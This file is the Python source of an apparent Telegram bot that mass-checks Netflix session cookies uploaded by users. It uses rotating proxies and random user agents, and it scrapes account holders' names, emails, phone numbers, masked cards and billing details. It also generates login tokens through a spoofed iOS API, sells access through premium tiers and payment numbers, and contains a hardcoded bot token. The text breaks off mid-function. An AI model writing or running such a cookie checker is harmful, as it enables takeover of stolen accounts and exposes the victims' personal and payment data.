import os, re, json, logging, requests, io, zipfile, hashlib, tempfile
import time, asyncio, codecs, html as html_mod, random, string, threading, csv, base64
from collections import OrderedDict, defaultdict, deque, Counter
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

# Try PDF support
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas as pdf_canvas
    PDF_OK = True
except ImportError:
    PDF_OK = False

# ============================================================
# CONFIG
# ============================================================
def load_config():
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"Config error: {e}")
        return {}

CFG = load_config()
TOKEN = CFG.get("TOKEN", "8885826481:AAFoTrgR63Co5tGrszKcIimnjs0zLj6D_gU")
OWNER_ID = CFG.get("OWNER_ID", 7294948308)
ADMIN_IDS = set(CFG.get("ADMIN_IDS", [7294948308]))
WATERMARK = CFG.get("WATERMARK", "Made By @RBX404")
BACKUP_CHANNEL = CFG.get("BACKUP_CHANNEL", -1003816732910)
FREE_DAILY_LIMIT = CFG.get("FREE_DAILY_LIMIT", 5)
REFERRALS_TO_PREMIUM = CFG.get("REFERRALS_TO_PREMIUM", 5)
REFERRAL_PREMIUM_DAYS = CFG.get("REFERRAL_PREMIUM_DAYS", 7)

# ✅ MANDATORY FORCE JOIN
FORCE_JOIN_ENABLED = True
FORCE_JOIN_CHANNELS = [
    -1004422074999,   # @SkillShareBDCommunity
    -1003816732910,   # @BlackoutZoneRBX404
]
FORCE_JOIN_NAMES = {
    -1004422074999: "SkillShare BD Community",
    -1003816732910: "Blackout Zone RBX404",
}
FORCE_JOIN_URLS = {
    -1004422074999: "https://t.me/SkillShareBDCommunity",
    -1003816732910: "https://t.me/BlackoutZoneRBX404",
}

DAILY_BONUS_CREDITS = CFG.get("DAILY_BONUS_CREDITS", 3)
TRIAL_DAYS = CFG.get("TRIAL_DAYS", 3)
AUTO_BACKUP = CFG.get("AUTO_BACKUP_ENABLED", True)
SUPPORT_GROUP = CFG.get("SUPPORT_GROUP", None)
PAYMENT_INFO = CFG.get("PAYMENT_INFO", {"bkash": "01838372430", "nagad": "01732466920"})

# ✅ MULTI-THREAD
MAX_WORKERS = 100
BATCH_SIZE = 50
MAX_LIVE_HITS = 30
COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20

# ✅ VIP TIERS
VIP_TIERS = {
    "Bronze":   {"min_refs": 5,   "days": 7,   "emoji": "🥉"},
    "Silver":   {"min_refs": 15,  "days": 30,  "emoji": "🥈"},
    "Gold":     {"min_refs": 30,  "days": 60,  "emoji": "🥇"},
    "Platinum": {"min_refs": 50,  "days": 120, "emoji": "💎"},
}

MAINTENANCE_MODE = False

# Data files
PREMIUM_FILE = "premium_users.json"
REFERRAL_FILE = "referrals.json"
HITS_DB_FILE = "hits_database.json"
USERS_FILE = "users.json"
BANNED_FILE = "banned_users.json"
PROMO_FILE = "promo_codes.json"
TRIAL_FILE = "trial_users.json"
AUDIT_FILE = "audit_log.json"
PAYMENTS_FILE = "payment_requests.json"
BONUS_FILE = "daily_bonus.json"
TICKETS_FILE = "support_tickets.json"
STATS_FILE = "hit_stats.json"
STREAK_FILE = "user_streaks.json"
WATCHLIST_FILE = "watchlist.json"
NOTIFY_FILE = "notify_settings.json"
SESSION_FILE = "session_history.json"
REF_LEADERBOARD_FILE = "ref_leaderboard.json"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}
NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent",
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}

cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()
db_lock = threading.RLock()
proxy_lock = threading.Lock()
global_executor = ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="nf_worker")

tv_stats = {
    "total_logins": 0, "successful": 0, "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}
bot_start_time = time.time()

# ============================================================
# NFToken API
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true"}',
    "device_type": "NFAPPL-02-", "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false", "languages": "en-US",
    "locale": "en-US", "maxDeviceWidth": "375", "model": "saget", "modelType": "IPHONE8-1",
    "odpAware": "true", "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1", "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone", "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1", "x-netflix.context.max-device-width": "375",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US", "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1", "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo", "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
log = logging.getLogger("NetflixBot")

# ============================================================
# USER AGENTS (20+)
# ============================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]

def get_random_ua():
    return random.choice(UA_POOL)

def get_random_headers():
    return {
        "User-Agent": get_random_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
    }

# ============================================================
# SAFE HELPERS
# ============================================================
def safe_filename(name):
    if not name: return "file"
    return re.sub(r'[^a-zA-Z0-9_.-]', '_', str(name))[:100]

def load_json(path, default=None):
    if default is None: default = {}
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            log.warning(f"Load {path}: {e}")
    return default

def save_json(path, data):
    with db_lock:
        try:
            tmp = path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str, ensure_ascii=False)
            os.replace(tmp, path)
        except Exception as e:
            log.error(f"Save {path}: {e}")

def clean_unicode(val):
    if not isinstance(val, str): return val
    try: val = codecs.decode(val, 'unicode_escape')
    except Exception: pass
    try: val = html_mod.unescape(val)
    except Exception: pass
    try:
        val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    except Exception: pass
    return ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')

def safe_html(text):
    if not text: return "Unknown"
    text = clean_unicode(str(text))
    return text.encode('ascii', errors='replace').decode('ascii', errors='replace')

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

EMAIL_RE = re.compile(r'([A-Za-z0-9.%+-]{2})[A-Za-z0-9.%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_text(text: str) -> str:
    if not text: return "Unknown"
    text = safe_html(text)
    text = EMAIL_RE.sub(lambda m: f"{m.group(1)}***{m.group(2)}", text)
    text = PHONE_RE.sub(lambda m: f"{m.group(1)}******{m.group(2)}", text)
    return text

def make_progress_bar(current, total, length=15):
    if total <= 0: return "[" + "░" * length + "] 0%"
    filled = min(length, int(length * current / total))
    return f"[{'█' * filled}{'░' * (length - filled)}] {int(100 * current / total)}%"

def parse_iso(s):
    try: return datetime.fromisoformat(s)
    except Exception: return None

# ============================================================
# PROXY
# ============================================================
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
    if m:
        s, u, p, h, port = m.groups()
        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
        return {"http": url, "https": url}
    m = re.match(r'^([^:]+):(\d+)$', line)
    if m:
        return {"http": f"http://{m.group(1)}:{m.group(2)}",
                "https": f"http://{m.group(1)}:{m.group(2)}"}
    return None

def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p: proxies.append(p)
    return proxies

proxies_list = load_proxies()
proxy_rotation_idx = 0

def get_rotating_proxy():
    global proxy_rotation_idx
    if not proxies_list: return None
    with proxy_lock:
        p = proxies_list[proxy_rotation_idx % len(proxies_list)]
        proxy_rotation_idx = (proxy_rotation_idx + 1) % len(proxies_list)
    return p

def check_proxy_health(proxy, timeout=5):
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxy, timeout=timeout, verify=False)
        return r.status_code == 200
    except Exception:
        return False

# ============================================================
# DATABASES
# ============================================================
premium_data = load_json(PREMIUM_FILE, {})
banned_users = set(load_json(BANNED_FILE, []))
referrals_data = load_json(REFERRAL_FILE, {})
users_data = load_json(USERS_FILE, {})
promo_codes = load_json(PROMO_FILE, {})
trial_users = load_json(TRIAL_FILE, {})
audit_log = load_json(AUDIT_FILE, [])
payment_requests = load_json(PAYMENTS_FILE, [])
daily_bonus_claimed = load_json(BONUS_FILE, {})
support_tickets = load_json(TICKETS_FILE, [])
hit_stats = load_json(STATS_FILE, {"countries": {}, "total_hits": 0})
user_streaks = load_json(STREAK_FILE, {})
watchlist_data = load_json(WATCHLIST_FILE, {})
notify_settings = load_json(NOTIFY_FILE, {})
session_history = load_json(SESSION_FILE, {})

user_daily_usage = defaultdict(lambda: {"date": None, "count": 0})
user_action_times = defaultdict(lambda: deque(maxlen=15))
user_message_times = defaultdict(lambda: deque(maxlen=20))
user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_tasks = {}
user_lang = {}

# ============================================================
# ACCESS CONTROL
# ============================================================
def is_premium(user_id):
    if user_id in ADMIN_IDS: return True
    data = premium_data.get(str(user_id))
    if not data: return False
    exp = parse_iso(data.get("expires", ""))
    if exp and exp > datetime.now(): return True
    return False

def get_premium_expiry(user_id):
    d = premium_data.get(str(user_id))
    return d.get("expires", "Unknown") if d else None

def register_user(user_id, username=None):
    uid = str(user_id)
    if uid not in users_data:
        users_data[uid] = {"username": username or "Unknown",
                          "joined": datetime.now().isoformat(), "total_checks": 0}
        save_json(USERS_FILE, users_data)
        if uid not in trial_users and not is_premium(user_id):
            trial_users[uid] = {
                "started": datetime.now().isoformat(),
                "expires": (datetime.now() + timedelta(days=TRIAL_DAYS)).isoformat()
            }
            save_json(TRIAL_FILE, trial_users)

def is_trial_active(user_id):
    data = trial_users.get(str(user_id))
    if not data: return False
    exp = parse_iso(data.get("expires", ""))
    return exp is not None and exp > datetime.now()

def check_access(user_id):
    if user_id in ADMIN_IDS: return True, "admin", -1
    if user_id in banned_users: return False, "banned", 0
    if is_premium(user_id): return True, "premium", -1
    if is_trial_active(user_id): return True, "trial", -1
    today = datetime.now().strftime("%Y-%m-%d")
    usage = user_daily_usage[user_id]
    if usage["date"] != today:
        usage["date"] = today
        usage["count"] = 0
    remaining = FREE_DAILY_LIMIT - usage["count"]
    if remaining <= 0: return False, "limit", 0
    return True, "free", remaining

def consume_usage(user_id, count=1):
    if user_id in ADMIN_IDS or is_premium(user_id) or is_trial_active(user_id):
        return
    user_daily_usage[user_id]["count"] += count
    uid = str(user_id)
    if uid in users_data:
        users_data[uid]["total_checks"] = users_data[uid].get("total_checks", 0) + count
        save_json(USERS_FILE, users_data)

def is_rate_limited(user_id, max_actions=6, window=60):
    if user_id in ADMIN_IDS: return False
    now = time.time()
    times = user_action_times[user_id]
    while times and now - times[0] > window:
        times.popleft()
    if len(times) >= max_actions: return True
    times.append(now)
    return False

def is_spamming(user_id, max_msgs=12, window=10):
    if user_id in ADMIN_IDS: return False
    now = time.time()
    times = user_message_times[user_id]
    while times and now - times[0] > window:
        times.popleft()
    if len(times) >= max_msgs: return True
    times.append(now)
    return False

def log_audit(admin_id, action, target=None):
    audit_log.append({"admin": str(admin_id), "action": action,
                     "target": str(target) if target else None,
                     "time": datetime.now().isoformat()})
    if len(audit_log) > 5000:
        audit_log[:] = audit_log[-5000:]
    save_json(AUDIT_FILE, audit_log)

# ============================================================
# VIP TIER + REFERRAL LEADERBOARD
# ============================================================
def check_and_reward_vip(ref_id, count):
    tier = None
    for name, data in VIP_TIERS.items():
        if count >= data["min_refs"]:
            tier = name
    if not tier:
        if count % REFERRALS_TO_PREMIUM == 0:
            exp = (datetime.now() + timedelta(days=REFERRAL_PREMIUM_DAYS)).isoformat()
            premium_data[ref_id] = {"expires": exp, "tier": "Basic"}
            save_json(PREMIUM_FILE, premium_data)
        return
    tdata = VIP_TIERS[tier]
    exp = (datetime.now() + timedelta(days=tdata["days"])).isoformat()
    premium_data[ref_id] = {"expires": exp, "tier": tier}
    save_json(PREMIUM_FILE, premium_data)

def update_ref_leaderboard(ref_id, count):
    try:
        lb = load_json(REF_LEADERBOARD_FILE, {})
        lb[str(ref_id)] = count
        save_json(REF_LEADERBOARD_FILE, lb)
    except Exception:
        pass

# ============================================================
# FORCE JOIN — MANDATORY
# ============================================================
async def check_force_join(user_id, context):
    if user_id in ADMIN_IDS:
        return True, []
    if not FORCE_JOIN_CHANNELS:
        return True, []
    missing = []
    for channel in FORCE_JOIN_CHANNELS:
        try:
            member = await context.bot.get_chat_member(channel, user_id)
            if member.status in ('left', 'kicked'):
                missing.append(channel)
        except Exception as e:
            log.warning(f"Force join check {channel}: {e}")
            missing.append(channel)
    return len(missing) == 0, missing

async def force_join_prompt(update, missing_channels):
    buttons = []
    for ch in missing_channels:
        label = FORCE_JOIN_NAMES.get(ch, str(ch))
        url = FORCE_JOIN_URLS.get(ch, f"https://t.me/{ch}")
        emoji = "👥" if "Community" in label else "📢"
        buttons.append([InlineKeyboardButton(f"{emoji} Join {label}", url=url)])
    buttons.append([InlineKeyboardButton("✅ Verify Join", callback_data="verify_join")])

    msg = (
        "🔒 <b>Force Join Required</b>\n\n"
        "বট ব্যবহার করতে প্রথমে <b>গ্রুপ</b> এবং <b>চ্যানেলে</b> join করতে হবে:\n\n"
        "👥 <b>Group:</b>\n"
        "   <a href='https://t.me/SkillShareBDCommunity'>@SkillShareBDCommunity</a>\n\n"
        "📢 <b>Channel:</b>\n"
        "   <a href='https://t.me/BlackoutZoneRBX404'>@BlackoutZoneRBX404</a>\n\n"
        "✅ Join করার পর <b>Verify Join</b> বাটনে ক্লিক করুন।\n"
        "⚠️ <i>Verify না করলে বট কাজ করবে না।</i>"
    )
    try:
        if update.callback_query:
            await update.callback_query.message.reply_html(
                msg, reply_markup=InlineKeyboardMarkup(buttons), disable_web_page_preview=True)
        else:
            await update.message.reply_html(
                msg, reply_markup=InlineKeyboardMarkup(buttons), disable_web_page_preview=True)
    except Exception as e:
        log.error(f"FJ prompt: {e}")

async def verify_join_callback(update, context):
    q = update.callback_query
    joined, missing = await check_force_join(q.from_user.id, context)
    if joined:
        await q.answer("✅ Verified! এখন বট ব্যবহার করুন।", show_alert=True)
        try: await q.message.delete()
        except Exception: pass
        await context.bot.send_message(
            q.from_user.id,
            "✅ <b>Verification Successful!</b>\n\n"
            "🎉 এখন আপনি বট ব্যবহার করতে পারবেন।\n\n"
            "👉 /start কমান্ড দিন।",
            parse_mode='HTML'
        )
    else:
        names = [FORCE_JOIN_NAMES.get(c, str(c)) for c in missing]
        await q.answer(f"❌ এখনো join করেননি: {', '.join(names)}", show_alert=True)

# ============================================================
# COOKIE PARSER
# ============================================================
def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cd = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cd.get('NetflixId'): results.append(("json", cd))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for c in obj["cookies"]:
                        if isinstance(c, dict) and c.get("name") in NETFLIX_COOKIE_NAMES:
                            merged[c["name"]] = c["value"]
                    if merged.get('NetflixId'): results.append(("json_cookies", merged))
            elif isinstance(obj, list):
                merged = {}
                for c in obj:
                    if isinstance(c, dict):
                        name = c.get("name") or c.get("key")
                        if name and c.get("value") and name in NETFLIX_COOKIE_NAMES:
                            merged[name] = c["value"]
                if merged.get('NetflixId'): results.append(("json_list", merged))
    except Exception: pass

    entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")): continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in NETFLIX_COOKIE_NAMES:
            entries.append({"name": parts[5], "value": parts[6]})
    if entries:
        for nf in [e for e in entries if e["name"] == "NetflixId"]:
            cs = {"NetflixId": nf["value"]}
            for e in entries:
                if e["name"] != "NetflixId": cs[e["name"]] = e["value"]
            results.append(("netscape", cs))

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        sc = {}
        for part in line.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                if k.strip() in NETFLIX_COOKIE_NAMES: sc[k.strip()] = v.strip()
        if sc.get('NetflixId'): results.append(("semicolon", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            if k.strip() in NETFLIX_COOKIE_NAMES: kv[k.strip()] = v.strip()
    if kv.get('NetflixId'): results.append(("kv", kv))

    for nf_val in re.findall(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE):
        cs = {"NetflixId": nf_val.strip('"\'')}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m: cs[cn] = m.group(1).strip('"\'')
        results.append(("regex", cs))
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for info in z.infolist():
                if info.is_dir() or info.filename.startswith(('__MACOSX', '.')): continue
                if info.filename.lower().endswith(('.txt', '.json')):
                    try:
                        content = z.read(info).decode('utf-8', errors='ignore')
                        for idx, (_, cc) in enumerate(parse_cookie_file(content)):
                            if cc.get('NetflixId'):
                                cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception: continue
    except Exception as e:
        log.error(f"ZIP extract: {e}")
    return cookies

# ============================================================
# NETFLIX CHECK
# ============================================================
def check_netflix_cookie(cookie_dict, max_retries=2):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    last = None
    for attempt in range(max_retries):
        proxy = get_rotating_proxy()
        r = _check_single(cookie_dict, proxy)
        if r.get('ok'): return r
        last = r
        if attempt < max_retries - 1:
            time.sleep(random.uniform(0.3, 1.0))
    return last or {'ok': False, 'reason': 'All retries failed', 'cookie': cookie_dict}

def _check_single(cookie_dict, proxy=None):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': get_random_ua(), 'Accept': 'text/html',
               'Accept-Language': 'en-US,en;q=0.9'}
    try:
        resp, txt = None, ""
        for url in ['https://www.netflix.com/YourAccount', 'https://www.netflix.com/account']:
            try:
                r = session.get(url, headers=headers, proxies=proxy, timeout=25,
                                allow_redirects=True, verify=False)
                if r.status_code == 200 and ('Account' in r.text or 'membershipStatus' in r.text):
                    resp, txt = r, r.text
                    break
            except Exception: continue
        if not resp:
            return {'ok': False, 'reason': 'No response', 'cookie': cookie_dict}
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'Redirected to login', 'cookie': cookie_dict}
        if resp.status_code != 200:
            return {'ok': False, 'reason': f'HTTP {resp.status_code}', 'cookie': cookie_dict}

        def find(pat):
            m = re.search(pat, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = clean_unicode(plan_raw) if plan_raw else None
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"') or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        card = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        phone_ver = "Yes" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"') or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)') or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        hold = "Yes" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else None
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
        ms_m = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = ms_m.group(1) if ms_m else None
        is_prem = (ms == 'CURRENT_MEMBER') if ms else bool(plan and 'free' not in str(plan).lower())
        household = find(r'"householdStatus"\s*:\s*"([^"]+)"')
        country_signup = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')

        if not any([name, email, country, plan, ms, guid]):
            return {'ok': False, 'reason': 'No data', 'cookie': cookie_dict}

        profiles = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", headers=headers,
                             proxies=proxy, timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text) or \
                           re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
        except Exception: pass

        return {
            'ok': True, 'premium': is_prem,
            'name': name or 'Unknown', 'country': country or 'Unknown',
            'plan': plan or 'Unknown', 'plan_price': plan_price or 'Unknown',
            'member_since': member_since or 'Unknown', 'next_billing': next_billing or 'Unknown',
            'payment_method': payment or 'Unknown', 'masked_card': card or 'Unknown',
            'phone': phone or 'Unknown', 'phone_verified': phone_ver or 'Unknown',
            'video_quality': quality or 'Unknown', 'max_streams': streams or 'Unknown',
            'on_payment_hold': hold or 'Unknown', 'extra_member': extra or 'Unknown',
            'email_verified': email_ver or 'Unknown', 'email': email or 'Unknown',
            'profiles': ", ".join([safe_html(p) for p in profiles]) if profiles else 'Unknown',
            'user_guid': guid or 'Unknown', 'membership_status': ms or 'Unknown',
            'household': household or 'Unknown', 'country_signup': country_signup or 'Unknown',
            'cookie': cookie_dict, 'timestamp': datetime.now().isoformat(),
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e)[:80], 'cookie': cookie_dict}

def generate_nftoken(cookie_dict):
    nf = cookie_dict.get('NetflixId')
    if not nf: return None, "No NetflixId"
    for attempt in range(3):
        try:
            headers = dict(NFTOKEN_HEADERS)
            headers["Cookie"] = f"NetflixId={nf}"
            headers["User-Agent"] = get_random_ua()
            proxy = get_rotating_proxy()
            r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers,
                             timeout=20, verify=False, proxies=proxy)
            r.raise_for_status()
            data = r.json()
            td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            token = td.get("token")
            expires = td.get("expires")
            if not token: return None, "Dead cookie"
            if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
